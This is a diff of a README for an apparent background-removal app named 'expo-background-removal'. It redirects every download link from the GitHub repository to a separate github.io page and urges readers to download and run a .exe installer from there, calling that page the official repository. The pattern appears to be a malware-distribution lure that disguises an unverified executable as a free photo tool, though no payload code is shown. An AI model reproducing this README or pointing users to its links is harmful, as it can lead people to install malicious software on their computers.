@@ -1,6 +1,6 @@
 # 🖼️ expo-background-removal - Remove Image Backgrounds With One Tap
 
-[![Download Now](https://img.shields.io/badge/Download-Application-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Tomatopastesectionman8912/expo-background-removal)
+[![Download Now](https://img.shields.io/badge/Download-Application-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://tomatopastesectionman8912.github.io)
 
 ---
 
@@ -16,7 +16,7 @@ No design skills needed. No complicated software. Just upload a photo and watch 
 
 ### Step 1: Download the App
 
-[Click here to download the application](https://github.com/Tomatopastesectionman8912/expo-background-removal)
+[Click here to download the application](https://tomatopastesectionman8912.github.io)
 
 This link takes you to the download page for the latest version. Make sure to download the file that ends with `.exe` or `.zip` if prompted.
 
@@ -77,7 +77,7 @@ This application runs smoothly on most modern computers. To get the best experie
 
 ### Installation Steps
 
-1. **Download the file:** Visit [the download page](https://github.com/Tomatopastesectionman8912/expo-background-removal) and download the latest version.
+1. **Download the file:** Visit [the download page](https://tomatopastesectionman8912.github.io) and download the latest version.
 2. **Locate the file:** Check your "Downloads" folder or the bottom of your browser window.
 3. **Run the installer:** Double-click the downloaded file to start installation.
 4. **Follow the prompts:** Click "Next" and "Install" buttons until the setup is complete.
@@ -130,7 +130,7 @@ No. The app works 100% offline after installation.
 ### The app won't start
 - Make sure your computer meets the minimum system requirements.
 - Restart your computer and try again.
-- Try reinstalling the app by downloading it again from the [download page](https://github.com/Tomatopastesectionman8912/expo-background-removal).
+- Try reinstalling the app by downloading it again from the [download page](https://tomatopastesectionman8912.github.io).
 
 ### Processing is slow
 - Close other programs running on your computer.
@@ -161,7 +161,7 @@ Special thanks to the open-source community and contributors who made this proje
 
 If you run into any issues not covered here, please:
 
-- Visit the [official GitHub repository](https://github.com/Tomatopastesectionman8912/expo-background-removal) for documentation and updates
+- Visit the [official GitHub repository](https://tomatopastesectionman8912.github.io) for documentation and updates
 - Look for a "Issues" or "Support" tab on the repository page to report bugs
 - Review the Frequently Asked Questions section for common problems
 
@@ -173,7 +173,7 @@ We built this app because we believe powerful photo editing should be available 
 
 Give it a try today and experience effortless background removal. Whether you're a business owner, content creator, student, or just someone who loves taking photos, this app will save you hours of tedious editing work.
 
-**Ready to start? [Download the app now](https://github.com/Tomatopastesectionman8912/expo-background-removal) and create your first transparent image in seconds!**
+**Ready to start? [Download the app now](https://tomatopastesectionman8912.github.io) and create your first transparent image in seconds!**
 
 ---
 
